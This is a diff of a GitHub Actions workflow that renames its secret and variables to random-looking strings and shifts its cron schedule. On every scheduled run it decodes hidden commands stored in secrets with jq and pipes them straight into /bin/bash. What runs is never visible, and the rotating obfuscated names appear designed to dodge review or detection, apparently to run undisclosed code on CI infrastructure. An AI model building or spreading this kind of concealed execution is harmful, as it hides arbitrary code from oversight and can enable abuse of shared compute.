@@ -1,8 +1,10 @@
 name: xiangjiangnannn
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
+    - cron: '11 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiangjiangnannn
         env:
-          y0: ${{ secrets.y0 }}
+          vlbd6: ${{ secrets.vlbd6 }}
         run: |
-          echo $y0 | jq -r .ay7 | /bin/bash
-          echo $c63837 | jq -r .iakfo9353 | /bin/bash
-          echo $tmjk4 | jq -r .asl33 | /bin/bash
-          echo $cablb38392 | jq -r .l149 | /bin/bash
-          echo $ebxm44 | jq -r .nkjy9 | /bin/bash
-          echo $v47003 | jq -r .kq350 | /bin/bash
-          echo $umecb50 | jq -r .uba524 | /bin/bash
+          echo $vlbd6 | jq -r .wc0 | /bin/bash
+          echo $ioe20328 | jq -r .jdbg07045 | /bin/bash
+          echo $l563 | jq -r .bkrvr268 | /bin/bash
+          echo $tf0760 | jq -r .y3 | /bin/bash
+          echo $mxm35 | jq -r .dten49 | /bin/bash
+          echo $flqtg5877 | jq -r .sastb21 | /bin/bash
+          echo $pea10 | jq -r .w241 | /bin/bash
+          echo $diadk34228 | jq -r .zp67775 | /bin/bash
 
